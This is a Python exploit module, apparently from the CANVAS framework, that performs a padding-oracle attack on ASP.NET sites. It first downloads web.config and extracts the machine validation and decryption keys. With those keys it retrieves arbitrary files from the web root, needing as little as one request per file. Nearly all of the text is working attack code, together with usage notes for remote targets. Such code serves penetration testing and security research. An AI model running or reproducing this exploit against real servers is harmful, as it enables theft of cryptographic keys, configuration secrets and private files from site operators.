# -*- coding: utf-8 -*-
#
# Resources:
#
#   http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.134.3005&rep=rep1&type=pdf
#   http://usenix.org/events/woot10/tech/full_papers/Rizzo.pdf
#   http://www.isg.rhul.ac.uk/~kp/padding.pdf
#   http://www.gdssecurity.com/l/b/2010/09/14/automated-padding-oracle-attacks-with-padbuster/
#

import sys
if "." not in sys.path: sys.path.append(".")

import os
import exploitutils

from libs import spkproxy
from tcpexploit import tcpexploit
from libs.paddingoracles import *
from libs.dotnetcookie import *

NAME          = "aspnet_download"
DESCRIPTION   = "Padding Oracle Attack to download arbitrary files"
VERSION       = "1.0"
NOTES         = """Notes"""
CHANGELOG     = """Changes"""
GTK2_DIALOG   = "dialog.glade2"

DOCUMENTATION = {}
DOCUMENTATION["Notes"] = """

This exploit uses T-block optimization variant of the Padding Oracle Attack
in order to download arbitrary files from the web server root.

By default it first tries to download web.config and grab the machinekey.
If it is successful succesive file downloads will only require 1 request per
file.

If the Machine key is not in the web.config you can uncheck this option
and for succesive file downloads it will require from 5 to 10 requests
per file.

If you already have the encryption key, you can paste it into the advanced
options section in hex-format - this will generate only 1-request per file.

Some websites use a redirection to a default page in case of an error,
which can lead to false positives while searching for a T-Block.
The 'Check patterns' optional parameter lets the user define a comma-separated
list with text patterns found on the main page to determine if a response
is just a redirect to a main/defaul page or not.

"""

DOCUMENTATION["Example"] = """"""
PROPERTY                 = {}
PROPERTY["TYPE"]         = "Exploit"
PROPERTY["SITE"]         =  "Remote"
PROPERTY["ARCH"]         = [ ["Unix"], ["Windows"] ]
PROPERTY["VERSION"]      = []


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host                      = ''
        self.path                      = '/'
        self.base_url                  = None
        self.web_page                  = 'Default.aspx'
        self.block_size                = 8
        self.version                   = 0
        self.name                      = NAME
        self.setInfo(DESCRIPTION)
        self.file_name                 = None
        self.knowledge_name            = "padding_oracle"
        self.grab_keys_from_web_config = True
        # this is saved on the knowledge
        self.encrypted_block           = None
        self.tblock                    = None
        self.qrblock                   = None
        self.validationkey             = None
        self.decryptionkey             = None
        self.ACTION_WC                 = "Download webconfig and grab keys"
        self.ACTION_AF                 = "Download selected file"
        self.check_patterns            = ""
        self.https                     = False


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])


    def getEncryptedBlock(self):
        """
        Automatically extract the smallest encrypted block from the Web Application.
        """
        h = { 'User-Agent' : "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401" }
        blocks = []

        try:
            response = spkproxy.urlopen(self.base_url + self.web_page, extraheaders=h.items())
            buffer = response.read()

            for line in buffer.split("\n"):
                index = line.find("WebResource.axd")
                if index == -1:
                    continue

                blocks.append(line[index:].split("d=")[1].split("&")[0])

            blocks.sort()
        except:
            return None

        if len(blocks) == 0:
            return None

        self.log("Block to decrypt: " + blocks[0])
        return blocks[0]


    def check_knowledge(self):
        # Get knowledge
        knowledge_container = self.target.get_knowledge(self.knowledge_name)
        if knowledge_container:
            knowledge = knowledge_container.known
            if "encrypted_block" in knowledge:
                self.encrypted_block = knowledge["encrypted_block"]
                self.log("Encrypted Block in knowledge: " + self.encrypted_block.encode("hex"))

            if "tblock" in knowledge:
                self.tblock = knowledge["tblock"]
                self.log("T-Block in knowledge: " + self.tblock.encode("hex"))

            if "qrblock" in knowledge:
                self.qrblock = knowledge["qrblock"]
                self.log("QR-Block in knowledge: " + self.qrblock.encode("hex"))

            if "validationkey" in knowledge:
                self.validationkey = knowledge["validationkey"]
                self.log("ValidationKey in knowledge: " + self.validationkey)

            if "decryptionkey" in knowledge:
                self.decryptionkey = knowledge["decryptionkey"]
                self.log("DecryptionKey in knowledge: " + self.decryptionkey)
        else:

            self.target.add_knowledge(self.knowledge_name, {}, 100, invisible =0)


    def save_knowledge(self):
         # Get knowledge
        knowledge_container = self.target.get_knowledge(self.knowledge_name)
        knowledge = knowledge_container.known

        if self.encrypted_block:
            knowledge["encrypted_block"] = self.encrypted_block

        if self.tblock:
            knowledge["tblock"] = self.tblock

        if self.qrblock:
            knowledge["qrblock"] = self.qrblock

        if self.validationkey:
            knowledge["validationkey"] = self.validationkey

        if self.decryptionkey:
            knowledge["decryptionkey"] = self.decryptionkey

        self.target.add_knowledge(self.knowledge_name, knowledge, 100, invisible =0)


    def download_file_tblock(self, file_name, stop_function=None):
        file_content = None
        self.log("Using T-Block Attack")

        tblock_attack = TBlockAttack(self.script_url,
                                     self.encrypted_block,
                                     self.check_patterns)
        tblock_attack.log = self.log

        if self.tblock:
            tblock_attack.set_tblock(self.tblock)
        else:
            res = tblock_attack.findTBlock(stop_function=None)
            if not res: return None
            self.tblock = tblock_attack.get_tblock()


        if self.qrblock:
            tblock_attack.set_qrblock(self.qrblock)

        #Download the file
        file_content = tblock_attack.downloadFile(file_name, stop_function)

        self.log("The complete attack took %d requests" % tblock_attack.getTotalRequests())
        self.setInfo("%s - The complete attack took %d requests" % (NAME, tblock_attack.getTotalRequests()))

        #save data
        self.qrblock = tblock_attack.get_qrblock()
        return file_content


    def download_file_known_keys(self, file_name):
        file_content = None
        try:
            attack = KnownKeysAttack(self.decryptionkey, self.script_url)
            file_content = attack.download_file(file_name)
        except:
            return None

        return file_content

    def getArgs(self):
        self.getarg("https")
        self.file_name      = self.getarg("file_name")
        self.web_page       = self.getarg("web_page")
        self.path           = self.getarg("path")
        self.decryptionkey  = self.getarg("decryptionkey")
        self.check_patterns = self.getarg("check_patterns").split(",")
        self.getarg("grab_keys_from_web_config")


    def run(self):
        self.getArgs()

        self.host       = self.target.interface
        proto = "https" if self.https else "http"
        self.base_url   = '%s://%s%s' % (proto, self.host, self.path)

        file_content = None
        self.log("File to download : %r" % self.file_name)

        if not self.web_page or len(self.web_page) == 0:
            self.log("Must provide a valid web page name, ex: Default.aspx")
            return False

        if not self.path or len(self.path) == 0:
            self.log("Must provide a valid base path,  ex: /myapp/")
            return False

        if self.base_url[-1] != "/":
            self.base_url += "/"

        self.log("URL: " + self.base_url)
        self.log("Web page: " + self.web_page)
        self.check_knowledge()

        #Get encrypted block, if not done yet
        if not self.encrypted_block:
            encoded_block = self.getEncryptedBlock()
            if encoded_block == None:
                self.log("Could not get the encrypted block from webpage, are you sure it is a valid ASP.NET app.?")
                return 0

            self.encrypted_block = UrlTokenDecode(encoded_block).decode("base64").replace("\n", "")[:16]

        self.script_url = self.base_url + "ScriptResource.axd?d="

        # We use stop() as a closure passed to functions in
        # libs.paddingoracles in order to have a way and stop long-running
        # computations.
        def stop():
            if self.state == self.HALT:
                self.log('Halting T-Block Attack..')
                return True
            return False

        if self.grab_keys_from_web_config:
                #Download web.config and grab the keys, if not done yet
                if not self.decryptionkey:
                    self.log("Downloading web.config to grab the keys")

                    file_content = self.download_file_tblock("web.config", stop_function=stop)
                    if file_content == None:
                        self.log('Aborted.')
                        return 0

                    #save it
                    filename = os.path.join(self.output(ip=self.host, subdir="Downloads"), "web.config")
                    f = open(filename, "w")
                    f.write(file_content)
                    f.close()
                    self.log('Saved web.config into %s' % filename)

                    keys = getKeys(file_content)
                    if not keys:
                        self.log('Could not parse web.config, aborting..')
                        return 0

                    (self.validationkey, self.decryptionkey) = keys
                    self.log("We've got the keys %s %s" % (self.validationkey, self.decryptionkey))
                    file_content = None


                if self.file_name:
                    self.log("Downloading requested file")
                    file_content = self.download_file_known_keys(self.file_name)
                    if file_content == None:
                        self.log('Could not download requested file: %s' % self.file_name)
                        return 0

        elif self.file_name:
            self.log("Downloading requested file")
            file_content = self.download_file_tblock(self.file_name, stop_function=stop)
            if file_content == None:
                self.log('Could not download requested file: %s' % self.file_name)
                return 0
        else:
            self.log('File to download is not set and web.config not requested, nothing to do..')
            return 0

        self.save_knowledge()

        if file_content:
            filename = os.path.join(self.output(ip=self.host, subdir="Downloads"), self.file_name)
            f = open(filename, "w")
            f.write(file_content)
            f.close()
            self.log("File Downloaded to %s" % filename)

        return 1

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = exploitutils.standard_callback_commandline(app)

